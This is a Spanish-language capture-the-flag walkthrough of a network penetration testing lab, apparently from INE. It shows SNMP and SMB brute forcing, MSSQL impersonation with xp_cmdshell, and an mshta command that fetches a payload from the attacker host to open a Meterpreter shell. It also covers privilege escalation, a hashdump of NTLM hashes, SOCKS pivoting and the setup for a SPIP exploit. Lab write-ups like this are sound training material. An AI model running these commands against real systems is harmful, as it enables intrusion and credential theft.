
# Network Penetration Testing CTF 1

## <mark style="color:purple;">Introducción</mark>

Este laboratorio se centra en el uso de SNMP para extraer datos confidenciales y establecer una base inicial en un sistema objetivo. Posteriormente, deberás escalar privilegios y cambiar de estrategia para comprometer una aplicación vulnerable en una máquina que no es directamente accesible desde Kali. Mediante el descubrimiento de datos confidenciales, el acceso a la consola, la explotación de vulnerabilidades y la elevación de privilegios, avanzarás a través de un escenario de ataque en varias etapas.

***

## <mark style="color:purple;">Task 1</mark>

> Utiliza SNMP para descubrir un usuario con acceso a un recurso compartido sensible en server.prod.local

#### Hosts

Tenemos 2 objetivos: `web.prod.local` y `server.prod.local`

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.4        INE
127.0.0.1 AttackDefense-Kali
10.10.49.4      INE
10.2.17.185    server.prod.local
10.2.17.28    web.prod.local
```

Por el momento nos centraremos en `server.prod.local` ya que no tenemos conectividad a `web.prod.local` y necesitamos acceder por pivoting.

### Escaneo de puertos

#### Escaneo TCP

```bash
┌──(root㉿INE)-[~]
└─# nmap -v -sV server.prod.local

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.5026; SP2
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Escaneo UDP

```bash
┌──(root㉿INE)-[~]
└─# nmap -v -sU server.prod.local

PORT     STATE         SERVICE
123/udp  open|filtered ntp
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
500/udp  open|filtered isakmp
1434/udp open|filtered ms-sql-m
3389/udp open|filtered ms-wbt-server
4500/udp open|filtered nat-t-ike
5353/udp open|filtered zeroconf
5355/udp open|filtered llmnr
```

Encontramos servicios interesantes como SNMP y MS-SQL.

### Enumeración SNMP

```bash
┌──(root㉿INE)-[~]
└─# nmap -sU -p161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.2.24.244

PORT    STATE         SERVICE
161/udp open|filtered snmp
| snmp-brute: 
|_  blue - Valid credentials
```

Encontramos un community string válido: **"blue"**.

Ahora podemos enumerar SNMP con este community string:

#### Enumerar usuarios Windows

```bash
┌──(root㉿INE)-[~]
└─# snmpwalk -v 2c -c blue 10.2.17.185 1.3.6.1.4.1.77.1.2.25    
                                                                           
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.7.116.105.109.111.116.104.121 = STRING: "timothy"
iso.3.6.1.4.1.77.1.2.25.1.1.8.115.115.109.45.117.115.101.114 = STRING: "ssm-user"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
```

Encontramos algunos usuarios válidos.

#### Enumerar shares

```bash
msfconsole
use scanner/snmp/snmp_enumshares
set RHOSTS server.prod.local
set COMMUNITY blue
exploit

[+] 10.2.24.244
        secrets -  (C:\Users\timothy\Documents\secrets)
[*] Scanned 1 of 1 hosts (100% complete)
```

Encontramos el recurso compartido **"secrets"** que está en `C:\Users\timothy\Documents\secrets`.

Ahora el objetivo es acceder a ese recurso compartido usando el usuario **timothy** que descubrimos anteriormente.

### Bruteforce SMB

```bash
┌──(root㉿INE)-[~]
└─# crackmapexec smb 10.2.17.185 -u timothy -p /usr/share/wordlists/rockyou.txt 

SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-A251FFF) (domain:EC2AMAZ-A251FFF) (signing:False) (SMBv1:False)
SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [-] EC2AMAZ-A251FFF\timothy:123456 STATUS_LOGON_FAILURE 
SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [-] EC2AMAZ-A251FFF\timothy:12345 STATUS_LOGON_FAILURE 
SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [-] EC2AMAZ-A251FFF\timothy:123456789 STATUS_LOGON_FAILURE 
SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [-] EC2AMAZ-A251FFF\timothy:password STATUS_LOGON_FAILURE 
SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [-] EC2AMAZ-A251FFF\timothy:iloveyou STATUS_LOGON_FAILURE 
SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [-] EC2AMAZ-A251FFF\timothy:princess STATUS_LOGON_FAILURE 
SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [-] EC2AMAZ-A251FFF\timothy:1234567 STATUS_LOGON_FAILURE 
<----SNIP---->
SMB         10.2.17.185     445    EC2AMAZ-A251FFF  [+] EC2AMAZ-A251FFF\timothy:jordan
```

Encontramos la contraseña: **jordan**

Ahora podemos acceder al recurso compartido "secrets" con el usuario timothy.

#### Acceder al recurso compartido secrets

```bash
┌──(root㉿INE)-[~]
└─# smbclient //10.2.17.185/secrets -U timothy%jordan
                                                                                 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 28 20:58:18 2026
  ..                                 DR        0  Tue Feb 25 18:26:23 2025
  flag1.txt                           A       34  Sat Mar 28 20:58:18 2026
  mssql_creds.txt                     A       39  Tue Feb 25 15:23:39 2025

                7863807 blocks of size 4096. 1663276 blocks available
smb: \> get flag1.txt 
getting file \flag1.txt of size 34 as flag1.txt (3.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)
smb: \> get mssql_creds.txt 
getting file \mssql_creds.txt of size 39 as mssql_creds.txt (4.2 KiloBytes/sec) (average 4.0 KiloBytes/sec)
```

Obtenemos la flag1 y credenciales para MSSQL:

```bash
┌──(root㉿INE)-[~]
└─# cat flag1.txt                                                                                                                         
6477bec5e41b4e53baa4a4e9********
```

```bash
┌──(root㉿INE)-[~]
└─# cat mssql_creds.txt                                                                                                                   
username: timmy
password: def_32121_@#
```

***

## <mark style="color:purple;">Task 2</mark>

> Obtén acceso a la consola del servidor server.prod.local

### Explotación de MSSQL

```bash
┌──(root㉿INE)-[~]
└─# impacket-mssqlclient timmy:def_32121_@#@10.2.17.185
                                                                              
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(EC2AMAZ-A251FFF\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(EC2AMAZ-A251FFF\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL (timmy  guest@master)>
```

#### Ver usuarios sysadmin

```sql
SQL (timmy  guest@master)> select loginname from syslogins where sysadmin = 1;

loginname   
---------   
sa 
```

#### Impersonar a sysadmin

```sql
SQL (timmy  guest@master)> EXECUTE AS LOGIN = 'sa';
SQL (sa  dbo@master)> SELECT SYSTEM_USER;
     
--   
sa   
```

#### **Habilitar ejecución de comandos (xp\_cmdshell)**

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Y comprobamos que podemos ejecutar comandos:

```sql
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';

output                        
---------------------------   
nt service\mssql$sqlexpress  
```

### **Reverse Shell**

```bash
msfconsole
use exploit/windows/misc/hta_server
exploit

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.49.4:4444 
[*] Using URL: http://10.10.49.4:8080/itpEeO4hS3.hta
[*] Server started.
```

```bash
SQL (sa  dbo@master)> exec xp_cmdshell "mshta.exe http://10.10.49.4:8080/itpEeO4hS3.hta"
```

Recibimos la sesión de Meterpreter:

```bash
[*] 10.2.17.185      hta_server - Delivering Payload
[*] Sending stage (176198 bytes) to 10.2.17.185
[*] Meterpreter session 1 opened (10.10.49.4:4444 -> 10.2.17.185:49780) at 2026-03-30 15:35:31 +0530

meterpreter > getuid
Server username: NT Service\MSSQL$SQLEXPRESS
```

### Acceso a la flag 2

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2025-02-03 14:20:53 +0530  $Recycle.Bin
100666/rw-rw-rw-  0       fil   2024-01-10 10:12:09 +0530  $WINRE_BACKUP_PARTITION.MARKER
040777/rwxrwxrwx  0       dir   2025-01-16 01:54:37 +0530  $WinREAgent
100666/rw-rw-rw-  1       fil   2021-05-08 13:44:33 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2025-01-16 02:03:31 +0530  Boot
040777/rwxrwxrwx  0       dir   2025-02-25 15:09:54 +0530  Config.Msi
040777/rwxrwxrwx  0       dir   2021-08-19 05:04:55 +0530  Documents and Settings
000000/---------  0       fif   1970-01-01 05:30:00 +0530  DumpStack.log.tmp
040777/rwxrwxrwx  0       dir   2021-08-19 11:54:49 +0530  EFI
040777/rwxrwxrwx  0       dir   2021-05-08 13:50:24 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2025-02-25 15:07:38 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2025-02-25 15:07:56 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2025-02-25 15:10:34 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2025-02-03 14:17:00 +0530  Recovery
040777/rwxrwxrwx  4096    dir   2024-10-09 07:07:07 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2025-02-25 18:26:00 +0530  Users
040777/rwxrwxrwx  16384   dir   2025-02-25 14:39:58 +0530  Windows
100444/r--r--r--  440698  fil   2025-01-16 01:59:06 +0530  bootmgr
100666/rw-rw-rw-  34      fil   2026-03-28 20:58:18 +0530  flag2.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag2.txt 
f8489216770f466ea88e21f1********
```

***

## <mark style="color:purple;">Task 3</mark>

> Obtener privilegios elevados en server.prod.local

Podemos elevar privilegios fácilmente con Meterpreter:

```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Hashdump

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ssm-user:1000:aad3b435b51404eeaad3b435b51404ee:1826c12913ca8b1069bd1260f17327fa:::
timothy:1002:aad3b435b51404eeaad3b435b51404ee:dd555241a4321657e8b827a40b67dd4a:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d:::
```

Probamos a crackearlas y no obtenemos resultados, solo conseguimos crackear la de timothy que ya la teníamos.

### Acceso a la flag 3

```powershell
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2025-02-03 14:20:44 +0530  desktop.ini
100666/rw-rw-rw-  34    fil   2026-03-28 20:58:18 +0530  flag3.txt

meterpreter > cat flag3.txt 
40be937975b147bb82daa3b0********
```

***

## <mark style="color:purple;">Task 4</mark>

> Explotar una aplicación vulnerable en web.prod.local

#### Interfaces de red internas

Observamos que estamos en la red interna `10.2.17.0/20`

```powershell
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

Interface 11
============
Name         : AWS PV Network Device
Hardware MAC : 02:dc:31:bc:71:e3
MTU          : 9001
IPv4 Address : 10.2.17.185
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::5643:40b3:9711:3cfe
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

Y desde esta máquina podemos hacer ping a `web.prod.local`:

```powershell
meterpreter > shell

Process 3364 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.3091]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> ping 10.2.17.28

Pinging 10.2.17.28 with 32 bytes of data:
Reply from 10.2.17.28: bytes=32 time=3ms TTL=64
Reply from 10.2.17.28: bytes=32 time=1ms TTL=64
Reply from 10.2.17.28: bytes=32 time<1ms TTL=64
Reply from 10.2.17.28: bytes=32 time=1ms TTL=64

Ping statistics for 10.2.17.28:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)
```

### Pivoting

#### Habilitar Autoroute

```bash
meterpreter > run autoroute -s 10.2.17.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.2.17.0/255.255.240.0...
[+] Added route to 10.2.17.0/255.255.240.0 via 10.2.17.185
[*] Use the -p option to list all active routes
```

#### Habilitar socks Proxy <a href="#habilitar-socks-proxy" id="habilitar-socks-proxy"></a>

{% hint style="warning" %}
Necesitamos configurarlo con el puerto y versión habilitado en proxychains, por defecto 9050 versión 4a
{% endhint %}

```bash
meterpreter > bg
msf6 exploit(windows/misc/hta_server) > search socks_proxy

Matching Modules
================

   #  Name                          Disclosure Date  Rank    Check  Description
   -  ----                          ---------------  ----    -----  -----------
   0  auxiliary/server/socks_proxy  .                normal  No     SOCKS Proxy Server

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/server/socks_proxy

msf6 exploit(windows/misc/hta_server) > use 0
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > exploit

[*] Auxiliary module running as background job 1.
[*] Starting the SOCKS proxy server
```

#### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# proxychains nmap -sT -Pn -p1-80 web.prod.local

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-30 15:39 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.17.28:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.17.28:22  ...  OK
```

Vemo que tiene abierto el puerto 80 (HTTP) y el 22 (SSH).

#### Enumeración web interna

Configuramos el proxy en el navegador:

<figure><img src="/files/KmRjJgZATH14VKLbekTq" alt=""><figcaption></figcaption></figure>

Y accedemos a la web `http://10.2.27.28`:

<figure><img src="/files/FYNsDyjZi2Qy0ZFKVuuR" alt=""><figcaption></figcaption></figure>

SPIP es un sistema de gestión de contenidos (CMS) de código abierto.

#### Whatweb

Con Whatweb encontramos la versión de `SPIP 4.3.1` que nos permite buscar exploits públicos:

{% code overflow="wrap" %}

```bash
┌──(root㉿INE)-[~]
└─# proxychains whatweb -v web.prod.local

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.17.28:80  ...  OK

WhatWeb report for http://web.prod.local
Status    : 200 OK
Title     : My SPIP site
IP        : 10.2.17.28
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], JQuery, MetaGenerator[SPIP 4.3.1], Script[text/javascript], SPIP[4.3.1][http://web.prod.local/local/config.txt], UncommonHeaders[composed-by,x-spip-cache]                                                                                             

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.41 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

<---SNIP--->

[ MetaGenerator ]
        This plugin identifies meta generator tags and extracts its 
        value. 

        String       : SPIP 4.3.1

[ SPIP ]
        SPIP is a publishing system for the Internet in which great 
        importance is attached to collaborative working, to 
        multilingual environments, and to simplicity of use for web 
        authors. 

        Version      : 4.3.1
        Module       : http://web.prod.local/local/config.txt
        Google Dorks: (1)
        Website     : http://www.spip.net/
```

{% endcode %}

### Explotación de SPIP

Encontramos varios exploits en Metasploit, y usaremos el más actual:

```bash
msf6 auxiliary(server/socks_proxy) > search spip

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/unix/webapp/spip_connect_exec    2012-07-04       excellent  Yes    SPIP connect Parameter PHP Injection
   1  exploit/unix/webapp/spip_rce_form        2023-02-27       excellent  Yes    SPIP form PHP Injection
   2    \_ target: Automatic (PHP In-Memory)   .                .          .      .
   3    \_ target: Automatic (Unix In-Memory)  .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/webapp/spip_rce_form
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Unix In-Memory)'

msf6 auxiliary(server/socks_proxy) > use 1
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/spip_rce_form) >
```

```bash
set RHOSTS 10.2.17.28
set RPORT 80
set LHOST 10.10.49.4                # IP Kali Linux
set LPORT 4445                      # Cambia el puerto para evitar conflictos
set Proxies socks4:127.0.0.1:9050   # Usar el proxy SOCKS
set TARGETURI /
exploit
```

Los probamos ambos y no funcionan.

Encontramos este artículo que hace referencia a un CVE asociado:

{% embed url="<https://github.com/advisories/GHSA-7w4r-xxr6-xrcj>" %}

Y nos encontramos esta PoC para explotarlo:

{% embed url="<https://github.com/Chocapikk/CVE-2024-8517/blob/main/exploit.py>" %}

{% hint style="danger" %}
PROBLEMA: En el lab no podemos copiar todo el codigo del exploit, por lo que lo explotaremos manualmente. Además es super inestable y se cae el objetivo final web.prod.local al intentar explotarlo.
{% endhint %}

#### Obtener Token Anti CSRF

```bash
┌──(root㉿INE)-[~]
└─# proxychains curl -s "http://10.2.17.28/spip.php?page=spip_pass" | grep -E "formulaire_action_args|formulaire_action_sign"                                         

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.17.28:80  ...  OK
                value='oubli'><input name='formulaire_action_args' type='hidden'
                value='vICFCP1Ztw6guOKUUSZXOwyh4J0myGlN7XyHPrGC1PcPYlk1AKwPbin4Psi466MfIpPkbe1rG/9HssUX3rkqouuh6b14PiblZw=='><input name='formulaire_action_sign' type='hidden'
```

***

## <mark style="color:purple;">Task 5</mark>

> Examina el archivo .plan de un usuario en web.prod.local en busca de una oportunidad de escalada de privilegios.
